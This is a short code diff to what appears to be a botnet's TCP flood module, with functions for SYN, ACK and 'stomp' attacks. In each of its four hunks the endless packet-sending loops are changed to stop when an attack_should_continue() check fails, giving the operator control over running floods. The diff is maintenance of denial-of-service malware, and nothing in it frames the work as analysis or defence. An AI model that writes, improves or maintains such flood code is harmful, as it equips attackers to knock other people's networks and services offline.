@@ -114,7 +114,7 @@ void attack_tcp_syn(uint8_t targs_len, struct attack_target *targs, uint8_t opts
         *opts++ = 6; // 2^6 = 64, window size scale = 64
     }
 
-    while (TRUE)
+    while (attack_should_continue())
     {
         for (i = 0; i < targs_len; i++)
         {
@@ -243,7 +243,7 @@ void attack_tcp_ack(uint8_t targs_len, struct attack_target *targs, uint8_t opts
 //
 //    }
 
-    while (TRUE)
+    while (attack_should_continue())
     {
         for (i = 0; i < targs_len; i++)
         {
@@ -365,7 +365,7 @@ void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t op
         start_recv = time(NULL);
 
         // Get info
-        while (TRUE)
+        while (attack_should_continue())
         {
             int ret;
 
@@ -454,7 +454,7 @@ void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t op
     }
 
     // Start spewing out traffic
-    while (TRUE)
+    while (attack_should_continue())
     {
         for (i = 0; i < targs_len; i++)
         {
